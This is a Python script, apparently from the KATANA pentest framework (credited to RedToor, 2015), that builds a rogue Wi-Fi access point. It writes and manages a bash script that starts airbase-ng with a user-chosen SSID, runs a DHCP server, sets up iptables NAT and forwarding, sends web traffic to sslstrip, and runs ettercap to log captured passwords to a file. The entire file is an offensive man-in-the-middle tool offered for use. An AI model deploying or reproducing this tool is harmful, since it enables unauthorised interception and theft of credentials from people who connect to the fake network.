# KATANA
# WifeApfake
# Script by RedToor
# 02/03/2015
import socket
import commands
from time import sleep
import os 

try:
	ip=([(s.connect(('8.8.8.8', 80)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1])
	if True:	
		gateway    =commands.getoutput("route -n | grep 'UG[ \t]' | awk '{print $2}'")
		interface  =commands.getoutput("route -n | grep 'UG[ \t]' | awk '{print $8}'")
		monitor    ="mon0"
		interface2 ="eth0"

		print "\n AP FAKE"
		essid=raw_input(" Enter SSID name For you rogue AP : ")

		print " Running"
		print ""
		print " IP        "+ip 
		print " Gateway   "+gateway
		print " Interface "+interface
		print " ESSID     "+essid
		print ""
		print " Creating Script Bash"
		outfile = open('/root/Desktop/sc.sh', 'w') 

		outfile.write("airmon-ng start "+interface)
		outfile.write('\necho "authoritative;default-lease-time 600;max-lease-time 7200;subnet 10.0.0.0 netmask 255.255.255.0 {option routers 10.0.0.1;option subnet-mask 255.255.255.0;option domain-name '+essid+';option domain-name-servers 10.0.0.1;range 10.0.0.20 10.0.0.50;}" > /root/Desktop/fakeap/dhcpd.conf')
		outfile.write("\nxterm -geometry 75x15+1+0 -T 'FakeAP - "+monitor+"' -e airbase-ng -c '1' -e "+essid+" "+monitor+" & fakeapid=$!")
		outfile.write("\nifconfig "+interface+" up")
		outfile.write('\nifconfig '+interface+' 10.0.0.1 netmask 255.255.255.0')
		outfile.write("\nifconfig "+interface+" mtu 1400")
		outfile.write('\nroute add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')
		outfile.write("\niptables --flush")
		outfile.write('\niptables --table nat --flush')
		outfile.write("\niptables --delete-chain")
		outfile.write('\niptables --table nat --delete-chain')
		outfile.write("\necho 1 > /proc/sys/net/ipv4/ip_forward")
		outfile.write('\niptables -t nat -A PREROUTING -p udp -j DNAT --to '+gateway)
		outfile.write("\niptables -P FORWARD ACCEPT")
		outfile.write('\niptables --append FORWARD --in-interface '+interface+' -j ACCEPT')
		outfile.write("\niptables --table nat --append PcommandsTROUTING --out-interface "+interface+" -j MASQUERADE")
		outfile.write('\niptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
		#outfile.write("\ntouch /var/run/dhcpd.pid")
		#outfile.write('\nchown dhcpd:dhcpd /var/run/dhcpd.pid')
		outfile.write("\nxterm -geometry 75x20+1+100 -T DHCP -e dhcpd -d -f -cf '/root/Desktop/fakeap/dhcpd.conf' & dchpid=$!")
		outfile.write('\nxterm -geometry 75x15+1+200 -T sslstrip -e sslstrip -f -p -k 10000 & sslstripid=$!')
		outfile.write("\nxterm -geometry 73x25+1+300 -T ettercap -s -sb -si +sk -sl 5000 -e ettercap -p -u -T -q -w /root/Desktop/fakeap/passwords -i "+interface+" & ettercapid=$!")
		outfile.close()
		print " Giving Permises to Script"
		commands.getoutput("chmod 777 /root/Desktop/sc.sh")
		print " Running Script"
		sleep(2)
		#os.system("/root/Desktop/sc.sh")
		print " Script runing"
		raw_input(" Press any key for Stop AP ")
		commands.getoutput("rm /root/Desktop/sc.sh")
		commands.getoutput("airmon-ng stop mon0")
		commands.getoutput("echo '0' > /proc/sys/net/ipv4/ip_forward")
		commands.getoutput("iptables --flush")
		commands.getoutput("iptables --table nat --flush")
		commands.getoutput("iptables --delete-chain")
		commands.getoutput("iptables --table nat --delete-chain")
except Exception as e:
	print e



